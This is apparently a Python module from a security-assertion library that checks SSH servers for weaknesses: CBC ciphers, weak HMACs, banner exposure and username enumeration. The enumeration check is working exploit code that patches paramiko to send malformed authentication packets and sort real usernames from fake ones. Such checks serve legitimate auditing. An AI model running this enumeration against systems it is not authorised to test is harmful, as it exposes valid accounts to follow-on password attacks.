# -*- coding: utf-8 -*-

"""This module allows to check SSH vulnerabilities."""

# standard imports
import socket
from contextlib import suppress

# 3rd party imports
import paramiko

# local imports
from fluidasserts import DAST, LOW, MEDIUM, _get_result_as_tuple_host_port
from fluidasserts.helper import banner, ssh
from fluidasserts.utils.decorators import unknown_if, api


# pylint: disable=protected-access


PORT: int = 22
OLD_ACCEPT = \
    paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]


class BadUsername(Exception):
    """Custom exception for when username is invalid."""


def _add_boolean(*args, **kwargs):  # pylint: disable=unused-argument
    pass


def _call_error(*args, **kwargs):
    raise BadUsername()


# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def _malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = _add_boolean
    result = OLD_ACCEPT(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result


# create function to perform authentication with malformed packet
def _check_ssh_username(host, port, username, tried=0):
    sock = socket.socket()
    sock.connect((host, port))

    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException as exc:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return _check_ssh_username(host, port, username, tried)
        raise exc
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except BadUsername:
        return False
    except paramiko.ssh_exception.AuthenticationException:
        return True
    raise Exception("There was an error. SSH connection was successful.")


@api(risk=MEDIUM, kind=DAST)
@unknown_if(socket.timeout, paramiko.ssh_exception.NoValidConnectionsError,
            paramiko.ssh_exception.SSHException, socket.error)
def has_user_enumeration(host: str, user_list: list,
                         fake_users: list, port: int = PORT):
    """
    Check if SSH is vulnerable to user enumeration.

    :param host: Address to test.
    :param port: If necessary, specify port to connect to.
    :param user_list: List of users.
    :param fake_users: List of fake users.
    """
    # pylint: disable=protected-access
    accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]
    failure = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_USERAUTH_FAILURE]
    paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT] = _malform_packet
    paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_USERAUTH_FAILURE] = _call_error
    valid = []
    invalid = []
    all_users = user_list + fake_users
    for user in all_users:
        if _check_ssh_username(host, port, user):
            valid.append(user)
        else:
            invalid.append(user)
    result = (set(valid) == set(user_list) and set(invalid) == set(fake_users))
    paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT] = accept
    paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_USERAUTH_FAILURE] = failure
    return _get_result_as_tuple_host_port(
        protocol='SSH', host=host, port=port,
        msg_open='Has user enumeration',
        msg_closed='Does not have user enumeration',
        open_if=result,
        auth=(user_list, fake_users))


@api(risk=MEDIUM, kind=DAST)
@unknown_if(socket.timeout, paramiko.ssh_exception.NoValidConnectionsError)
def is_cbc_used(host: str, port: int = PORT, username: str = None,
                password: str = None) -> tuple:
    """
    Check if SSH has CBC algorithms enabled.

    :param host: Address to test.
    :param port: If necessary, specify port to connect to.
    :param username: Username.
    :param password: Password.
    """
    result: bool = False
    with suppress(paramiko.ssh_exception.AuthenticationException):
        service = banner.SSHService(port)
        fingerprint = service.get_fingerprint(host)
        with ssh.build_ssh_object() as ssh_obj:
            ssh_obj.connect(host, port, username=username, password=password)
            transport = ssh_obj.get_transport()

        if '-cbc' in transport.remote_cipher:
            result = True

    return _get_result_as_tuple_host_port(
        protocol='SSH', host=host, port=port,
        msg_open='Uses insecure CBC encryption algorithms',
        msg_closed='Does not use insecure CBC encryption algorithms',
        open_if=result,
        auth=(username, password),
        fingerprint=fingerprint)


@api(risk=MEDIUM, kind=DAST)
@unknown_if(socket.timeout, paramiko.ssh_exception.NoValidConnectionsError)
def is_hmac_used(host: str, port: int = PORT, username: str = None,
                 password: str = None) -> tuple:
    """
    Check if SSH has weak HMAC algorithms enabled.

    :param host: Address to test.
    :param port: If necessary, specify port to connect to.
    :param username: Username.
    :param password: Password.
    """
    result: bool = False
    with suppress(paramiko.ssh_exception.AuthenticationException):
        service = banner.SSHService(port)
        fingerprint = service.get_fingerprint(host)
        with ssh.build_ssh_object() as ssh_obj:
            ssh_obj.connect(host, port, username=username, password=password)
            transport = ssh_obj.get_transport()

        if "hmac-md5" in transport.remote_cipher:
            result = True

    return _get_result_as_tuple_host_port(
        protocol='SSH', host=host, port=port,
        msg_open='Uses insecure HMAC encryption algorithms',
        msg_closed='Does not use insecure HMAC encryption algorithms',
        open_if=result,
        auth=(username, password),
        fingerprint=fingerprint)


@api(risk=LOW, kind=DAST)
def is_version_visible(ip_address: str, port: int = PORT) -> tuple:
    """
    Check if banner is visible.

    :param ip_address: IP address to test.
    :param port: If necessary, specify port to connect to (default: 22).
    """
    service = banner.SSHService(port)
    version = service.get_version(ip_address)
    fingerprint = service.get_fingerprint(ip_address)

    result: bool = bool(version)

    return _get_result_as_tuple_host_port(
        protocol='SSH', host=ip_address, port=port,
        msg_open='Version is visible',
        msg_closed='Version is not visible',
        open_if=result,
        fingerprint=fingerprint)
